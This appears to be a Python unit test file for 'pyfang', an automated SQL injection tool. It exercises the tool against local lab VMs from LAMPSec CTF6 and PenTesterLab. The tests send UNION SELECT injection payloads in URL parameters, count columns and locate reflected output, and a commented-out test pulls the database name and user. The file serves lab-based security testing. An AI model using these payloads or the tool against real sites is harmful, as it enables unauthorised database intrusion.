import unittest
import sys, os
import pyfang 
import builder, datastore, injector, scanner, obfuscator, parser, reporter

class Test_fang(unittest.TestCase):
    """
    A test class for the fang module.
    """
    # Create major classes
    def setUp(self):
        print 'Setting up tests...'
        self.CTF6_page = 'http://192.168.83.134/index.php?id=1'
        self.PTL_page = 'http://192.168.83.130/cat.php?id=1'

    def test_get_visible_nums(self):
        scan = scanner.Scanner()
        store = datastore.Store()
        parse = parser.Parser(store)

        print 'Testing parser\'s get visible params method...'

        # CTF6 from LAMPSec
        pre = scan.page('http://192.168.83.134/index.php?id=null')
        post = scan.page('http://192.168.83.134/index.php?id=null%20UNION%20SELECT%201,2,3,4,5,6,7')
        for i in parse.get_visible_nums(parse.html_diff(pre, post)):
            self.assertTrue(i.isdigit())

        # PenTesterLab
        pre = scan.page('http://192.168.83.130/cat.php?id=null')
        post = scan.page('http://192.168.83.130/cat.php?id=null%20UNION%20SELECT%201,%202,%203,4')
        for i in parse.get_visible_nums(parse.html_diff(pre, post)):
            self.assertTrue(i.isdigit())
        print 'Test done.\n'

    def test_get_num_columns(self):
        print 'Getting number of columns for building UNION statements...'

        # CTF6 from LAMPSec
        page = self.CTF6_page
        real_num_cols = 7
        num_cols_found = pyfang.num_columns(injector.Injector(page, ''), True)
        self.assertTrue(num_cols_found == real_num_cols)

        # PenTesterLab
        page = self.PTL_page
        real_num_cols = 4
        num_cols_found = pyfang.num_columns(injector.Injector(page, ''), True)
        self.assertTrue(num_cols_found == real_num_cols)

        print 'Test done.\n'

    def test_get_magic_number(self):
        print 'Getting \'magic number\', which display on page after SQLI...'

        # CTF6 from LAMPSec
        page = self.CTF6_page
        magic_num_found = pyfang.magic_num(injector.Injector(page, ''), True)
        real_magic_num = 7
        self.assertTrue(magic_num_found == real_magic_num)

        # PenTesterLab
        page = self.PTL_page
        real_magic_num = 2
        magic_num_found = pyfang.magic_num(injector.Injector(page, ''), True)
        self.assertTrue(magic_num_found == real_magic_num)

    """
    # Tests using VMWare basic SQLi from pentesterlabs
    def test_injection(self):
        print 'Testing basic injection with VMWare from pentesterlabs.com...'

        # IP is from my VM, vulnerable page and param already known.
        page = 'http://192.168.83.130/cat.php?id=1' 
        mysql_params = ['database()', 'user()']
        print injection.injection(page, mysql_params)
        print 'Basic injection done.'
    """

if __name__ == '__main__':
    unittest.main()


